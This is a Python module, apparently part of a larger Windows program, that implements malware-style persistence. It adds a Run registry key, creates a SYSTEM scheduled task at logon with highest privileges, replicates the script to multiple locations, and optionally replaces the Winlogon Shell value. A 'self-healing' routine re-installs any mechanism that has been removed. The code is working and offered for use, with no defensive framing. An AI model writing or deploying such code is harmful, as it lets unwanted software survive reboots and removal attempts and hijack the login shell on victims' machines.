"""
Persistence Manager - Handles all reboot persistence mechanisms
Registry, Task Scheduler, File Replication, Self-Healing
"""

import os
import winreg
import subprocess
import shutil
from datetime import datetime
from config import CONFIG


class PersistenceManager:
    def __init__(self, script_path):
        self.script_path = script_path
        self.registry_name = CONFIG["registry_name"]
        self.task_name = CONFIG["task_name"]
        self.file_copies = CONFIG["file_copies"]
    
    def install_all(self):
        """Install all persistence mechanisms"""
        results = {
            "registry": self.add_registry_entry(),
            "task": self.add_scheduled_task(),
            "files": self.copy_files(),
            "winlogon": self.add_winlogon_hook() if CONFIG["use_winlogon_hook"] else "skipped"
        }
        self._log("PERSISTENCE_INSTALL", f"Installed: {results}")
        return results
    
    def add_registry_entry(self):
        """Add to HKCU\Software\Microsoft\Windows\CurrentVersion\Run"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(
                key,
                self.registry_name,
                0,
                winreg.REG_SZ,
                f'pythonw.exe "{self.script_path}"'
            )
            winreg.CloseKey(key)
            self._log("REGISTRY", "Added successfully")
            return True
        except Exception as e:
            self._log("REGISTRY", f"Failed: {e}")
            return False
    
    def add_scheduled_task(self):
        """Create scheduled task at startup and logon"""
        try:
            cmd = (
                f'schtasks /create /tn "{self.task_name}" '
                f'/tr "pythonw.exe \"{self.script_path}\"" '
                f'/sc onlogon /ru SYSTEM /rl HIGHEST /f'
            )
            subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
            self._log("TASK_SCHEDULER", "Added successfully")
            return True
        except Exception as e:
            self._log("TASK_SCHEDULER", f"Failed: {e}")
            return False
    
    def copy_files(self):
        """Replicate script to multiple locations"""
        try:
            for location in self.file_copies:
                os.makedirs(os.path.dirname(location), exist_ok=True)
                shutil.copy2(self.script_path, location)
                self._log("FILE_COPY", f"Created: {location}")
            return True
        except Exception as e:
            self._log("FILE_COPY", f"Failed: {e}")
            return False
    
    def add_winlogon_hook(self):
        """Replace Winlogon shell (aggressive)"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(
                key,
                "Shell",
                0,
                winreg.REG_SZ,
                f'pythonw.exe "{self.script_path}"'
            )
            winreg.CloseKey(key)
            self._log("WINLOGON", "Shell replaced")
            return True
        except Exception as e:
            self._log("WINLOGON", f"Failed: {e}")
            return False
    
    def check_installed(self):
        """Check if any persistence exists"""
        checks = {"registry": False, "task": False, "files": False}
        
        # Check registry
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_READ
            )
            winreg.QueryValueEx(key, self.registry_name)
            checks["registry"] = True
            winreg.CloseKey(key)
        except:
            pass
        
        # Check task
        result = subprocess.run(
            f'schtasks /query /tn "{self.task_name}"',
            shell=True, capture_output=True
        )
        checks["task"] = result.returncode == 0
        
        # Check files
        for location in self.file_copies:
            if os.path.exists(location):
                checks["files"] = True
                break
        
        self._log("CHECK_PERSISTENCE", str(checks))
        return checks
    
    def verify_and_repair(self):
        """Self-healing - re-add if missing"""
        checks = self.check_installed()
        repaired = []
        
        if not checks["registry"]:
            self.add_registry_entry()
            repaired.append("registry")
        
        if not checks["task"]:
            self.add_scheduled_task()
            repaired.append("task")
        
        if not checks["files"]:
            self.copy_files()
            repaired.append("files")
        
        if repaired:
            self._log("PERSISTENCE_REPAIRED", f"Re-added: {repaired}")
        
        return repaired
    
    def remove_all(self):
        """Remove all persistence"""
        # Remove registry
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.DeleteValue(key, self.registry_name)
            winreg.CloseKey(key)
        except:
            pass
        
        # Remove task
        try:
            subprocess.run(
                f'schtasks /delete /tn "{self.task_name}" /f',
                shell=True, capture_output=True
            )
        except:
            pass
        
        # Remove files
        for location in self.file_copies:
            try:
                if os.path.exists(location):
                    os.remove(location)
            except:
                pass
        
        # Restore Winlogon
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, "explorer.exe")
            winreg.CloseKey(key)
        except:
            pass
        
        self._log("PERSISTENCE_REMOVED", "All persistence removed")
    
    def _log(self, action, details):
        """Internal logging"""
        try:
            with open(CONFIG["log_file"], "a") as f:
                import json
                log_entry = {
                    "timestamp": datetime.now().isoformat(),
                    "event": "PERSISTENCE",
                    "action": action,
                    "details": details
                }
                f.write(json.dumps(log_entry) + "\n")
        except:
            pass
